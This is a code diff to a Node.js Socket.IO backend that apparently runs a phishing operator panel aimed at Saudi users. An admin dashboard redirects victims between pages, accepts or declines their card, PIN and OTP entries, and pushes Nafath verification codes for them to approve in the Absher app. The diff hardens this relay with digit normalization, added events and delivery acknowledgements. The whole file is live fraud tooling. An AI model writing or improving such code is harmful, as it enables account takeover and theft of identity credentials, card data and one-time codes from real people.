@@ -539,37 +539,15 @@ const ADMIN_EVENT_ALIASES = {
 };
 
 function broadcastAdminEvent(id, event, payload) {
-  if (!id) return;
+  if (!id) return false;
   const target = io.to(`session:${id}`).to(`user:${id}`);
   const base = { id, uuid: id, userId: id };
   const data = payload && typeof payload === "object"
     ? { ...base, ...payload, id, uuid: id, userId: id }
     : base;
 
-  // Echo the raw event too, so a dashboard that already uses the
-  // customer-side names keeps working.
-  target.emit(event, data);
-
   const key = String(event || "").toLowerCase();
-  const alias = ADMIN_EVENT_ALIASES[key];
-  if (alias) {
-    const [aliasEvent, action] = alias;
-    target.emit(aliasEvent, { ...data, action });
-  }
-
-  // Redirect: dashboard chooses the destination page.
-  if (key === "adminredirect" || key === "redirect" || key === "admin:redirect") {
-    const redirectPayload = {
-      ...data,
-      page: data.page || data.path || data.route || data.to || "/",
-      pageName: data.pageName || data.title || "",
-    };
-    target.emit("admin:redirect", redirectPayload);
-  }
-
-  // Nafath verification number: dashboard sends the 2-digit code that
-  // the customer must tap in the Absher app on page 7. The customer
-  // bundle listens for `nafath:code` with { verificationCode: "42" }.
+  const isRedirectEvent = key === "adminredirect" || key === "redirect" || key === "admin:redirect";
   const isNafathNumberEvent =
     key === "changenavazcode" ||
     key === "nafathnumber" ||
@@ -583,6 +561,30 @@ function broadcastAdminEvent(id, event, payload) {
     /nafath.*(number|code)/.test(key) ||
     /(send|set).*nafath/.test(key);
 
+  // Preserve the exact legacy event that the current customer page listens
+  // for, but dispatch it only once through this unified handler.
+  if (!isRedirectEvent && !isNafathNumberEvent) target.emit(event, data);
+
+  const alias = ADMIN_EVENT_ALIASES[key];
+  if (alias) {
+    const [aliasEvent, action] = alias;
+    target.emit(aliasEvent, { ...data, action });
+  }
+
+  // Redirect: dashboard chooses the destination page.
+  if (isRedirectEvent) {
+    const redirectPayload = {
+      ...data,
+      page: data.page || data.path || data.route || data.to || "/",
+      pageName: data.pageName || data.title || "",
+    };
+    target.emit("admin:redirect", redirectPayload);
+    target.emit("adminRedirect", redirectPayload);
+  }
+
+  // Nafath verification number: dashboard sends the 2-digit code that
+  // the customer must tap in the Absher app on page 7. The customer
+  // bundle listens for `nafath:code` with { verificationCode: "42" }.
   if (isNafathNumberEvent) {
     const raw = String(
       data.verificationCode ??
@@ -593,16 +595,16 @@ function broadcastAdminEvent(id, event, payload) {
         data.value ??
         ""
     ).trim();
-    // Keep digits only, pad/truncate to 2 chars so the customer page
-    // always shows a clean two-digit badge.
-    const digits = raw.replace(/\D+/g, "").slice(0, 2).padStart(raw ? 2 : 0, "0");
-    const code = digits || raw;
-    target.emit("nafath:code", {
-      ...data,
-      verificationCode: code,
-      code,
-      number: code,
-    });
+    // Accept ASCII and Arabic decimal digits, then normalize to exactly 2.
+    const normalized = raw
+      .replace(/[٠-٩]/g, (digit) => String("٠١٢٣٤٥٦٧٨٩".indexOf(digit)))
+      .replace(/[۰-۹]/g, (digit) => String("۰۱۲۳۴۵۶۷۸۹".indexOf(digit)));
+    const digits = normalized.replace(/\D+/g, "").slice(0, 2);
+    if (!/^\d{2}$/.test(digits)) return false;
+    const code = digits;
+    const codePayload = { ...data, verificationCode: code, code, number: code, userOtp: code };
+    if (key === "changenavazcode") target.emit("changeNavazCode", codePayload);
+    target.emit("nafath:code", codePayload);
 
     // "Send # & Redirect": if the dashboard event or payload says so,
     // also push the client to page 7 (/nafath) so they see the badge.
@@ -629,6 +631,7 @@ function broadcastAdminEvent(id, event, payload) {
   }
 
   io.to("admins").emit(`admin:${event}`, { id, payload: data });
+  return true;
 }
 
 // ---------- REST: health / meta ----------
@@ -1265,12 +1268,16 @@ io.on("connection", (socket) => {
     "declineService",
     "acceptPaymentForm",
     "declinePaymentForm",
+    "acceptPayment",
+    "declinePayment",
     "acceptPin",
     "declinePin",
     "acceptPhone",
     "declinePhone",
     "acceptVisaOtp",
     "declineVisaOtp",
+    "acceptOtp",
+    "declineOtp",
     "acceptPhoneOtp",
     "declinePhoneOtp",
     "acceptPhoneOTP",
@@ -1354,9 +1361,11 @@ io.on("connection", (socket) => {
         stage: canonicalStage(data.stage || ev),
         blocked: actionStatus === "blocked" ? true : undefined,
       });
-      broadcastAdminEvent(id, ev, data);
+      const delivered = broadcastAdminEvent(id, ev, data);
       console.log(`[io] admin ${ev} -> ${id}`);
-      if (typeof ack === "function") ack({ ok: true });
+      if (typeof ack === "function") {
+        ack(delivered ? { ok: true } : { ok: false, error: "invalid_nafath_code" });
+      }
     });
   });
 
@@ -1465,43 +1474,6 @@ io.on("connection", (socket) => {
       ...p,
     })
   );
-
-  // Legacy frontend admin -> client actions (kept)
-  const legacyAdminEvents = [
-    "payment:action",
-    "otp:action",
-    "nafath:action",
-    "naflogin:action",
-    "phone:action",
-    "admin:redirect",
-  ];
-  for (const ev of legacyAdminEvents) {
-    socket.on(ev, (p = {}, ack) => {
-      const isAdmin =
-        socket.data.adminAuthenticated === true ||
-        (p &&
-          typeof p === "object" &&
-          (p.adminToken === ADMIN_TOKEN || p.token === ADMIN_TOKEN));
-      if (!isAdmin) {
-        if (typeof ack === "function") ack({ ok: false, error: "not_admin" });
-        return;
-      }
-      const target =
-        p.userId || p.sessionId || p.uuid || p.id || p.targetUserId || p._id;
-      if (!target) {
-        if (typeof ack === "function") ack({ ok: false, error: "missing_id" });
-        return;
-      }
-      const data = { ...p, id: target, uuid: target };
-      delete data.adminToken;
-      delete data.token;
-      io.to(`user:${target}`).emit(ev, data);
-      io.to(`session:${target}`).emit(ev, data);
-      io.to("admins").emit(`admin:${ev}`, { id: target, payload: data });
-      console.log(`[io] legacy admin ${ev} -> ${target}`);
-      if (typeof ack === "function") ack({ ok: true });
-    });
-  }
 
   socket.on("disconnect", (reason) => {
     JOIN_METRICS.disconnects++;
